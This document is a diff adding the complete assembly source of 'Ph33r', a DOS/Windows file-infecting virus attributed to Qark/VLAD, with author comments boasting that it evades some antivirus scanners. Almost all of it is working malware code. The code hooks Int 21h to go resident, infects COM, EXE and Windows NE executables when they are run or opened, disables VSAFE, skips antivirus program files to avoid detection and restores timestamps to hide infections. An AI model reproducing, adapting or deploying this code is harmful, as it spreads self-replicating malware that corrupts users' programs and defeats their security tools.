@@ -1,0 +1,828 @@
+;
+;
+;                        Ph33r
+;
+;                      Qark/VLAD
+;
+;
+;
+; This virus is the first ever DOS/Windows virus, infecting COM/EXE/WinEXE
+; files.
+; The technology of the Windows infection is superior to 'Winsurfer'
+; in that the virus goes directly resident, without having to mess around
+; infecting the Windows 'shell'.  The Windows entry of the virus allocates
+; memory, points a selector to it, copies the virus into the space and
+; sets interrupt 21h to the resident virus.  By careful programming it was
+; possible to make both the DOS and Win interrupt handlers share the same
+; code.
+;
+; The virus does a few interesting things:
+;       Disables MSAV by turning it off (DOS)
+;       Gets the original Int 21h using DOSSEG:109Eh (DOS)
+;       Won't infect a number of filenames 'AV' 'AN' 'OT' (DOS & Win)
+;
+; A few annoying things:
+;       If the DOS handler traps Int 21h AH=3Dh Windows crashes on load.
+;       If the virus infects WIN386.EXE Windows crashes on load.
+; These have both been fixed, by removal.
+;
+; For some unknown reason, the virus causes Debug to crash on exit.
+; I haven't fixed this, because I figure anyone who uses Debug will spot
+; the virus anyway.  Besides which, I haven't got a clue why it's happening :)
+;
+; For this virus, AVP & TBAV pick up nothing whilst F-Prot detects it
+; heuristically.
+;
+
+        org     0
+
+com_entry:                              ;COM files begin execution here.
+        call    exec_start
+        push    es
+        pop     ds
+
+        ;COM file exit.
+
+        mov     di,100h
+        push    di
+
+        db      0b8h                    ;MOV AX,xxxx
+old2    dw      20cdh
+        stosw
+        db      0b8h                    ;MOV AX,xxxx
+old4    dw      0
+        stosw
+        
+        xor     ax,ax
+        xor     bx,bx
+        xor     cx,cx
+        xor     dx,dx
+        xor     si,si
+        xor     di,di
+        ret
+
+exe_entry:                              ;EXE files begin execution here.
+        call    exec_start
+        push    es
+        pop     ds
+        
+        ;Setup ss:sp
+        mov     ax,ds
+        add     ax,10h
+        db      5                       ;ADD AX,xxxx
+old_ss  dw      0
+        mov     ss,ax
+        db      0bch                    ;MOV SP,xxxx
+old_sp  dw      0
+
+        ;setup the return
+        mov     ax,ds
+        add     ax,10h
+        db      5                       ;ADD AX,xxxx
+exe_cs  dw      0
+        push    ax
+        db      0b8h                    ;MOV AX,xxxx
+exe_ip  dw      0
+        push    ax
+        xor     ax,ax
+        xor     bx,bx
+        xor     cx,cx
+        xor     dx,dx
+        xor     si,si
+        xor     di,di
+        retf
+
+Exec_Start:
+        
+        cld
+        mov     ax,51ffh                ;Test resident.
+        int     21h
+        cmp     ax,0ff51h
+        je      exit_virus
+
+        mov     ax,0fa02h               ;Kill VSAFE.
+        mov     dx,5945h                ;Every DOS6+ user has a copy of this.
+        xor     bl,bl
+        int     16h
+        
+        mov     ax,ds
+        dec     ax
+        mov     ds,ax                   ;MCB seg in DS.
+        xor     di,di
+        cmp     byte ptr [di],'Y'       ;Z block ?
+        ja      allocate
+exit_virus:
+        ret
+allocate:
+        sub     word ptr [di+3],(offset virus_size*2/16)+1
+        sub     word ptr [di+12h],(offset virus_size*2/16)+1
+        mov     ax,word ptr [di+12h]
+
+        push    es
+        mov     es,ax
+        push    cs
+        pop     ds
+        mov     cx,offset virus_size
+
+        ;Get delta offset in SI
+        call    next
+next:
+        pop     si
+        sub     si,offset next
+
+        ;Move virus to free memory.
+        rep     movsb
+
+        mov     ds,cx                   ;DS=CX=0 from REP MOVSB
+
+        ;Set int21h
+        mov     si,21h*4
+        mov     di,offset i21
+        push    si
+        movsw
+        movsw
+        pop     si
+        mov     di,offset orig21
+        movsw
+        movsw
+
+        mov     word ptr [si-4],offset int21handler
+        mov     word ptr [si-2],es
+
+        push    es
+        mov     ah,52h                  ;Thanx Neurobasher!
+        int     21h
+        mov     ax,es
+        pop     es
+        mov     ds,ax
+
+        mov     si,109eh                ;DS:109Eh = Original Int 21 I hope.
+        lodsw
+        cmp     ax,9090h
+        jne     reset21
+        lodsb
+        cmp     al,0e8h
+        jne     reset21
+        mov     word ptr es:orig21,10a0h
+        mov     word ptr es:orig21+2,ds
+reset21:
+        pop     es
+        ret
+
+        db      '=Ph33r='
+
+win21:                          ;Windows interrupt handling begins here.
+        cmp     ax,51feh
+        jne     non_w_res
+        xchg    al,ah
+        iret
+non_w_res:
+        cmp     ax,4b00h                ;Execute.
+        je      check_infect
+        cmp     ah,3dh                  ;File Open.
+        je      check_infect
+        cmp     ah,56h                  ;Rename.
+        je      check_infect
+        cmp     ah,43h                  ;Chmod.
+        jne     int_exit
+
+check_infect:
+        pushf
+        pusha
+        push    ds
+        push    es
+        
+        mov     ax,0ah                  ;This function makes our CS writable.
+        mov     bx,cs
+        int     31h
+        mov     es,ax
+
+        call    setup_infect
+
+        pop     es
+        pop     ds
+        popa
+        popf
+        
+        jmp     int_exit
+
+int21handler:                           ;DOS interrupt handling begins here.
+        cmp     ax,51ffh
+        jne     non_res
+        xchg    al,ah
+        iret
+
+        db      'Qark/VLAD'
+
+non_res:
+;For some reason, checking for AH=3dh crashes windows when its booting.
+
+        cmp     ax,4b00h                ;Execute.
+        je      do_file
+        cmp     ah,6ch                  ;Open.
+        je      do_file
+        cmp     ah,56h                  ;Rename.
+        je      do_file
+        cmp     ah,43h                  ;Chmod.
+        je      do_file
+
+int_exit:
+        db      0eah
+i21     dd      0
+
+do_file:
+        push    es
+        push    dx
+        cmp     ah,6ch
+        jne     no_6c_fix
+        mov     dx,si
+no_6c_fix:
+        push    cs
+        pop     es
+        call    setup_infect
+        pop     dx
+        pop     es
+                
+        jmp     int_exit
+
+setup_infect:
+;on entry to this call, es=writable cs
+;ds:dx=filename
+        pushf
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+        cld
+        mov     si,dx
+asciiz:
+        lodsb
+        cmp     al,0
+        jne     asciiz
+        sub     si,4
+        lodsw
+        or      ax,2020h
+        cmp     ax,'xe'                 ;EXE
+        je      do_inf
+        cmp     ax,'ld'                 ;DLL
+        je      do_inf
+        cmp     ax,'oc'                 ;COM
+        jne     not_name
+do_inf:
+        cmp     word ptr [si-5],'68'    ;Dont infect WIN386.EXE (hangs)
+        je      not_name
+        mov     ax,word ptr [si-5]
+        or      ax,2020h                ;Lowercase.
+        cmp     ax,'va'                 ;Don't touch files that end in AV
+        je      not_name                ;eg TBAV
+        cmp     ax,'vd'                 ;DV.COM checks DV.EXE
+        je      not_name
+        cmp     ax,'na'                 ;Don't touch files that end in AN
+        je      not_name                ;eg SCAN, TBSCAN
+        cmp     ax,'to'                 ;Don't touch files that end in OT
+        je      not_name                ;eg F-PROT
+
+        call    infect
+not_name:
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        popf
+
+        ret
+
+Infect:
+;DS:DX=Filename, ES=our data segment
+        cld
+        mov     ax,3d02h                ;Open file to be infected.
+        call    int21h
+        jnc     file_opened
+        ret
+file_opened:
+        xchg    bx,ax                   ;File handle into BX.
+        push    es
+        pop     ds
+  
+        mov     ah,3fh                  ;Read from file.
+        mov     cx,512
+        mov     dx,offset virus_size
+        call    int21h
+
+        mov     si,offset virus_size
+        
+        mov     ax,word ptr [si]
+        or      ax,2020h
+        cmp     ax,'zm'                 ;Test for EXE header
+        je      check_exe
+        jmp     com_infect
+check_exe:
+        cmp     word ptr [si+12h],0afafh        ;Infection marker.
+        jne     not_infected
+bad_mem:
+        jmp     com_end
+not_infected:
+        cmp     word ptr [si+18h],40h           ;Windows executable.
+        jb      exe_infect
+        jmp     windows_infect
+exe_infect:
+        cmp     word ptr [si+0ch],-1            ;Maxmem = All
+        jne     bad_mem
+        
+        call    lseek_end                       ;Get file length in DX:AX
+        or      dx,dx
+        jnz     ok_exe_size
+        cmp     ax,1000
+        jb      bad_mem
+ok_exe_size:
+        mov     cx,512
+        div     cx
+        inc     ax
+        cmp     [si+4],ax                       ;Check for overlays.
+        ja      bad_mem
+
+        mov     ax,word ptr [si+0eh]            ;Save the original SS:SP
+        mov     word ptr old_ss,ax
+        mov     ax,word ptr [si+10h]
+        mov     word ptr old_sp,ax
+
+        mov     ax,word ptr [si+14h]            ;Save the original CS:IP
+        mov     word ptr exe_ip,ax
+        mov     ax,word ptr [si+16h]
+        mov     word ptr exe_cs,ax
+
+        call    lseek_end
+        mov     cx,16
+        div     cx
+
+        sub     ax,word ptr [si+8]
+        add     dx,offset exe_entry
+        mov     word ptr [si+14h],dx    ;New IP
+        mov     word ptr [si+16h],ax    ;New CS
+        
+        dec     ax
+        mov     word ptr [si+0eh],ax
+        add     dx,1500
+        and     dx,0fffeh
+        mov     word ptr [si+10h],dx
+
+        call    save_time
+
+        mov     cx,offset virus_size
+        mov     ah,40h
+        xor     dx,dx
+        call    int21h
+
+        call    lseek_end
+
+        mov     cx,512
+        div     cx
+        or      dx,dx
+        jz      no_page_fix
+        inc     ax
+no_page_fix:
+        mov     word ptr [si+4],ax
+        mov     word ptr [si+2],dx
+        call    lseek_start
+        
+        mov     word ptr [si+12h],0afafh        ;Set infection marker.
+        mov     ah,40h
+        mov     dx,si
+        mov     cx,1ch
+        call    int21h
+
+        call    restore_time
+
+        jmp     com_end
+
+com_infect:
+        cmp     byte ptr [si+3],0afh    ;Com infection marker.
+        je      com_end
+
+        ;Save first four com file bytes.
+        mov     di,offset old2
+        movsw
+        mov     di,offset old4
+        movsw
+        
+        mov     ax,4202h                ;Lseek to file end.
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        or      dx,dx                   ;Check if > 64k
+        jnz     com_end
+        cmp     ax,60000                ;Check if > 60000
+        ja      com_end
+        cmp     ax,1024
+        jb      com_end
+
+        sub     ax,3
+        mov     word ptr com_jmp+1,ax
+
+        call    save_time
+
+        mov     ah,40h                  ;Write virus body to file.
+        mov     cx,offset virus_size
+        xor     dx,dx
+        call    int21h
+        jc      com_end
+
+        mov     ax,4200h                ;Lseek to file start.
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        mov     ah,40h                  ;Write jump to start of file.
+        mov     cx,4
+        mov     dx,offset com_jmp
+        call    int21h
+
+com_time_end:
+        call    restore_time
+
+com_end:
+        mov     ah,3eh                  ;Close file.
+        call    int21h
+
+        ret
+
+windows_infect:
+
+        ;Move the Newexe pointer forward.
+        push    word ptr [si+3ch]
+        pop     word ptr newexe_off
+
+        sub     word ptr [si+3ch],8
+        cmp     word ptr [si+3eh],0     ;Dont want any NE headers at off >64k
+        jne     com_end
+        
+        mov     word ptr [si+12h],0afafh        ;Set infection marker.
+        
+        ;Lseek back to start of the file.
+        mov     ax,4200h
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        call    save_time
+
+        ;Write header back.
+        mov     ah,40h
+        mov     cx,512
+        mov     dx,offset virus_size
+        call    int21h
+        
+        jc      com_end
+
+        ;Lseek to new exe header
+        mov     ax,4200h
+        mov     dx,word ptr newexe_off
+        xor     cx,cx
+        call    int21h
+
+        ;Read in new exe header
+        mov     ah,3fh
+        mov     cx,512
+        mov     dx,offset virus_size
+        call    int21h
+
+        ;Adjust header pointers
+        mov     ax,word ptr [si+22h]    ;AX=Segment table offset.
+        cmp     word ptr [si+4],ax
+        jb      ok_et
+        add     word ptr [si+4],8
+ok_et:
+        cmp     word ptr [si+24h],ax
+        jb      ok_rt
+        add     word ptr [si+24h],8
+ok_rt:
+        cmp     word ptr [si+26h],ax
+        jb      ok_rnt
+        add     word ptr [si+26h],8
+ok_rnt:
+        cmp     word ptr [si+28h],ax
+        jb      ok_mrt
+        add     word ptr [si+28h],8
+ok_mrt:
+        cmp     word ptr [si+2ah],ax
+        jb      ok_int
+        add     word ptr [si+2ah],8
+ok_int:
+        mov     ax,word ptr [si+1ch]
+        inc     word ptr [si+1ch]       ;Increase segment count.
+        xor     dx,dx
+        mov     cx,8
+        mul     cx
+
+        add     ax,word ptr [si+22h]    ;AX=Offset of segment table end.
+        adc     dx,0
+        mov     cx,512                  ;512 byte portions are used
+                                        ; for the reads later on.
+        div     cx
+
+        mov     word ptr ne_size,ax
+        mov     word ptr last_ne,dx
+
+        ;Put the original CS:IP into our relocation table.
+        push    word ptr [si+14h]
+        pop     word ptr old_ip
+        push    word ptr [si+16h]
+        pop     word ptr old_cs
+
+        ;Save the alignment shift count because we need that for calculating
+        ;the offset of our segment when writing the segment entry.
+        push    word ptr [si+32h]
+        pop     word ptr al_shift
+
+        ;Point CS:IP to the virus.
+        mov     word ptr [si+14h],offset win_entry      ;The new IP
+        mov     ax,word ptr [si+1ch]
+        mov     word ptr [si+16h],ax                    ;The new CS
+
+        ;Initialise the lseek variable
+        push    word ptr newexe_off
+        pop     word ptr lseek
+
+        ;The below code gets the NE header and keeps moving it forward by
+        ;eight bytes in 512 byte chunks.
+move_header_forward:
+        mov     ax,word ptr ne_size
+        or      ax,ax
+        jz      last_page
+
+        dec     word ptr ne_size
+
+        mov     ax,4200h                ;Lseek to our current position.
+        xor     cx,cx
+        mov     dx,word ptr lseek
+        sub     dx,8
+        call    int21h
+
+        mov     ah,40h                  ;Write the header section out.
+        mov     cx,512
+        mov     dx,si
+        call    int21h
+
+        add     word ptr lseek,512
+
+        mov     ax,4200h                ;Lseek to the next chunk.
+        xor     cx,cx
+        mov     dx,word ptr lseek
+        call    int21h
+
+        mov     ah,3fh                  ;Read it.
+        mov     dx,offset virus_size
+        mov     cx,512
+        call    int21h
+
+        jmp     move_header_forward
+
+last_page:
+        mov     ax,4202h                ;Lseek to end of file.
+        xor     cx,cx
+        cwd
+        call    int21h                  ;File length into DX:AX
+
+        ;DX:AX=File offset of our segment
+        ;Below section shifts the segment offset right by the alignment
+        ;shift value.
+        mov     cl,byte ptr al_shift
+        push    bx
+        mov     bx,1
+        shl     bx,cl
+        mov     cx,bx
+        pop     bx
+        div     cx
+
+        mov     word ptr lseek_add,0
+        or      dx,dx
+        jz      no_extra
+        sub     cx,dx
+        mov     word ptr lseek_add,cx
+        inc     ax
+no_extra:
+        mov     di,si
+        add     di,word ptr last_ne
+
+        ;Adding the new segment table entry
+        mov     word ptr [di],ax        ;Segment offset
+        mov     word ptr [di+2],offset virus_size
+        mov     word ptr [di+4],180h    ;Segment attribute
+                                        ; 180h = NonMovable + Relocations
+        mov     word ptr [di+6],offset virus_size+512
+
+        mov     ax,4200h                ;Lseek to next position.
+        xor     cx,cx
+        mov     dx,word ptr lseek
+        sub     dx,8
+        call    int21h
+
+        mov     ah,40h          ;Write rest of NE header + new seg entry.
+        mov     cx,word ptr last_ne
+        add     cx,8            ;Added segment entry means eight more.
+        mov     dx,offset virus_size
+        call    int21h
+
+        ;Reset the relocatable pointer.
+        push    word ptr winip
+        push    word ptr wincs
+        mov     word ptr winip,0
+        mov     word ptr wincs,0ffffh
+
+        mov     ax,4202h                ;Lseek to end of file.
+        xor     cx,cx
+        mov     dx,word ptr lseek_add
+        call    int21h
+
+        mov     ah,40h                  ;Write main virus body.
+        mov     cx,offset virus_size
+        xor     dx,dx
+        call    int21h
+
+        pop     word ptr wincs
+        pop     word ptr winip
+
+        mov     ah,40h                  ;Write the relocation item.
+        mov     cx,offset reloc_end - offset relocblk
+        mov     dx,offset relocblk
+        call    int21h
+
+        jmp     com_time_end
+
+int21h:                                 ;Simulated int 21 call.
+        pushf
+        call    dword ptr cs:orig21
+        ret
+orig21  dd      0
+
+win_entry:                              ;WinEXE files begin execution here.
+        pusha
+        push    ds
+        push    es
+
+        mov     ax,51feh                ;Residency test.
+        int     21h
+        cmp     ax,0ff51h
+        je      no_wintsr
+        
+        mov     ax,000ah                ;Make CS writable.
+        mov     bx,cs
+        int     31h                     ;Use DPMI.
+        mov     ds,ax
+
+        mov     ax,0204h                ;Get real mode interrupt vector.
+        mov     bl,21h
+        int     31h
+
+        mov     word ptr i21,dx         ;Save int21
+        mov     word ptr i21+2,cx
+
+        mov     word ptr orig21,dx
+        mov     word ptr orig21+2,cx
+
+        mov     ax,501h
+        xor     bx,bx                   ;Allocate Linear region
+        mov     cx,offset v_mem_size
+        int     31h
+
+        push    bx
+        push    cx
+
+        xor     ax,ax
+        mov     cx,1                    ;Create a Selector
+        int     31h
+
+        mov     bx,ax
+        mov     ax,7
+        pop     dx                      ;Point selector to linear region.
+        pop     cx
+        int     31h
+
+        mov     ax,8
+        xor     cx,cx                   ;Set selector limit
+        mov     dx,offset v_mem_size
+        int     31h
+
+        mov     es,bx
+        mov     cx,offset v_mem_size
+        xor     si,si                   ;Copy virus to the linear region
+        xor     di,di
+        cld
+        rep     movsb
+
+        mov     bx,es
+        mov     ax,9                    ;Set access rights to 'Code'
+        mov     cx,0ffh
+        int     31h
+
+        mov     cx,es
+        mov     dx,offset win21
+        mov     ax,205h
+        mov     bl,21h
+        int     31h                     ;Set real mode interrupt vector.
+
+        mov     ax,4
+        push    es
+        pop     bx                      ;Lock the selector
+        int     31h
+
+no_wintsr:
+        pop     es
+        pop     ds
+        popa
+
+        db      0eah                    ;Return to original file.
+winip   dw      0
+wincs   dw      0ffffh
+
+;-----------------------
+;Infection Procedures
+;-----------------------
+Save_Time:
+        push    ax
+        push    cx
+        push    dx
+
+        mov     ax,5700h
+        call    int21h
+
+        mov     word ptr time,cx
+        mov     word ptr date,dx
+
+        pop     dx
+        pop     cx
+                                                                                pop     ax
+        ret
+
+Restore_Time:
+        push    ax
+        push    cx
+        push    dx
+
+        db      0bah            ;MOV DX,xxxx
+        date    dw      0
+
+        db      0b9h            ;MOV CX,xxxx
+        time    dw      0
+
+        mov     ax,5701h
+        call    int21h
+
+        pop     dx
+        pop     cx
+        pop     ax
+        ret
+
+Lseek_Start:
+        mov     al,0
+        jmp     short lseek2
+Lseek_End:
+        mov     al,2
+lseek2:
+        mov     ah,42h
+        xor     cx,cx
+        cwd
+        call    int21h
+        ret
+
+;-----------------------
+;Infection Data
+;-----------------------
+;Com infection data.
+com_jmp         db      0e9h,0,0,0afh
+
+;-----------------------
+;Windows infection data.
+newexe_off      dw      0
+al_shift        dw      0
+ne_size         dw      0
+last_ne         dw      0
+lseek           dw      0
+lseek_add       dw      0
+
+Relocblk:
+        dw      1       ;Number of relocation items
+
+        db      3       ;32bit pointer relocation
+        db      4       ;Additive relocation
+        dw      offset winip
+old_cs  dw      0       ;The stored original CS & IP of host.
+old_ip  dw      0
+
+
+Reloc_end:
+;-----------------------
+
+virus_size:
+        db      512 dup (0)     ;Storage buffer.
+v_mem_size:
+
